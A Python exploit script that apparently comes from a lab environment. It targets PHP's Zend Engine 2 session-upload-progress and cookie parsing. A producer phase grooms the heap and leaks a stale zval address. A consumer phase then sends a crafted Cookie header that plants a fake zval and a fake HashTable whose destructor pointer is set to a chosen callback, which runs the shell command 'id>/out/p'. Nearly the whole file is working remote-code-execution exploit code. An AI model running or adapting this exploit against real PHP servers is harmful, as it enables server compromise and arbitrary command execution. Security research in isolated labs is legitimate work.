#!/usr/bin/env python3
"""Two-phase terminal ZE2 fake-HashTable experiment.

The runner sends the producer first, reads the observer's stale zval address,
then invokes this program again with concrete addresses for the consumer.
All traffic stays on the Docker-internal lab network.
"""

from __future__ import annotations

import argparse
import socket
import struct


HOST = "php2shell-72-target"
ENDPOINT = "/index.php"
FIXED_COMMAND = b"id>/out/p"


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + part["name"] + b'"'
        if "filename" in part:
            out += b'; filename="' + part["filename"] + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def post(body: bytes, boundary: bytes, extra_headers: bytes = b"") -> bytes:
    header = (
        f"POST {ENDPOINT} HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
    ).encode() + extra_headers + b"Connection: close\r\n\r\n"
    with socket.create_connection((HOST, 80), 10) as sock:
        sock.settimeout(8)
        try:
            sock.sendall(header)
            for offset in range(0, len(body), 262144):
                sock.sendall(body[offset : offset + 262144])
        except OSError:
            return b""
        chunks: list[bytes] = []
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except OSError:
            pass
        return b"".join(chunks)


def status(response: bytes) -> bytes:
    return response.partition(b"\r\n")[0]


def producer(pads: int) -> bytes:
    parts = [
        {"name": b"PHPSESSID", "data": b"a" * 19},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(pads):
        parts.append({"name": f"p{index:06d}"[:7].encode(), "data": b"V" * 7})
    parts += [
        {"name": b"f", "filename": b"a.txt", "data": b"A" * 64},
        {"name": b"big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    boundary = b"S" * 17
    return post(multipart(parts, boundary), boundary)


def encode_all(value: bytes) -> bytes:
    return b"".join(f"%{byte:02X}".encode() for byte in value)


def calibrated_baseline_len(count: int, target: int) -> int:
    pairs = []
    for index in range(count):
        name = f"c{index:03d}".encode().ljust(31, b"n")
        if index == target:
            value = b"A" * 8 + b"B" * 8 + b"%01%00%00%00%04%00%00%00" + b"C" * 7
        elif index == count - 1:
            value = f"v{index:03d}".encode().ljust(15, b"J")
        else:
            value = f"v{index:03d}".encode().ljust(31, b"K")
        pairs.append(name + b"=" + value)
    return len(b"Cookie: " + b"; ".join(pairs) + b"\r\n")


def fake_zval(fake_ht: int) -> bytes:
    # 31 decoded bytes; _estrndup adds byte 31 as the allocation's NUL.
    out = p64(fake_ht) + b"Z" * 8
    out += p32(1) + bytes((4, 0)) + b"\x00\x00"
    # Bytes +24..+31 are zval_gc_info.buffered.  Leaving a printable tail here
    # makes _zval_ptr_dtor enter gc_remove_zval_from_buffer before it reaches
    # zend_hash_destroy.  Seven decoded NULs plus _estrndup's terminator clear
    # the complete pointer.
    out += b"\x00" * 7
    assert len(out) == 31
    return out


def fake_ht_bucket(fake_ht: int, callback: int, command: bytes) -> bytes:
    bucket = fake_ht + 72
    command_ptr = fake_ht + 144
    ht = bytearray(72)
    ht[0:4] = p32(8)             # nTableSize (unused by destroy)
    ht[4:8] = p32(0)             # nTableMask: skip arBuckets free
    ht[8:12] = p32(1)            # nNumOfElements
    ht[32:40] = p64(bucket)       # pListHead
    ht[40:48] = p64(bucket)       # pListTail
    ht[48:56] = p64(0)            # arBuckets
    ht[56:64] = p64(callback)     # pDestructor

    item = bytearray(72)
    item[16:24] = p64(command_ptr)  # pData => callback's first argument
    item[32:40] = p64(0)            # pListNext => stop after one callback

    blob = bytes(ht + item) + command + b"\x00"
    return blob


def terminal_cookie(count: int, target: int, stale: int,
                    callback: int, command: bytes) -> tuple[bytes, int, int]:
    fake_ht = stale + 0xD8
    carrier_index = target + 1
    decoded_target = fake_zval(fake_ht)
    decoded_carrier = fake_ht_bucket(fake_ht, callback, command)

    pairs: list[tuple[bytes, bytes]] = []
    for index in range(count):
        if index <= carrier_index:
            name = f"c{index:03d}".encode().ljust(31, b"n")
        else:
            name = b"x" + str(index).encode()
        if index == target:
            value = encode_all(decoded_target)
        elif index == carrier_index:
            value = encode_all(decoded_carrier)
        elif index > carrier_index:
            value = b"y"
        else:
            value = f"v{index:03d}".encode().ljust(31, b"K")
        pairs.append((name, value))

    wanted = calibrated_baseline_len(count, target)

    def render(items: list[tuple[bytes, bytes]]) -> bytes:
        return b"Cookie: " + b"; ".join(name + b"=" + value for name, value in items) + b"\r\n"

    current = render(pairs)
    padding = wanted - len(current)
    if padding < 0:
        raise SystemExit(f"terminal Cookie exceeds calibrated header by {-padding} bytes")
    last_name, last_value = pairs[-1]
    pairs[-1] = (last_name, last_value + b"J" * padding)
    header = render(pairs)
    assert len(header) == wanted
    return header, fake_ht, len(decoded_carrier)


def consumer(count: int, target: int, stale: int,
             callback: int, command: bytes) -> tuple[bytes, int, int, int]:
    boundary = b"B" * 10
    parts = [
        {"name": b"PHPSESSID", "data": b"attacksessionid0001attacksessi"},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwnpwnpwnpwnpwnpwnpwnpwnpwnp"},
    ]
    cookie, fake_ht, carrier_len = terminal_cookie(
        count, target, stale, callback, command
    )
    response = post(multipart(parts, boundary), boundary, cookie)
    return response, len(cookie), fake_ht, carrier_len


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("phase", choices=("producer", "consumer"))
    parser.add_argument("--pads", type=int, default=32)
    parser.add_argument("--cookie-count", type=int, default=40)
    parser.add_argument("--target-index", type=int, default=27)
    parser.add_argument("--stale", type=lambda value: int(value, 0))
    parser.add_argument("--callback", type=lambda value: int(value, 0))
    args = parser.parse_args()

    if args.phase == "producer":
        response = producer(args.pads)
        print("A", status(response), len(response), flush=True)
        return 0

    if args.stale is None or args.callback is None:
        parser.error("consumer requires --stale and --callback")
    response, cookie_len, fake_ht, carrier_len = consumer(
        args.cookie_count, args.target_index, args.stale,
        args.callback, FIXED_COMMAND
    )
    print(
        "B", status(response), len(response),
        f"cookie={cookie_len}", f"fake_ht={fake_ht:#x}",
        f"carrier={carrier_len}", flush=True
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
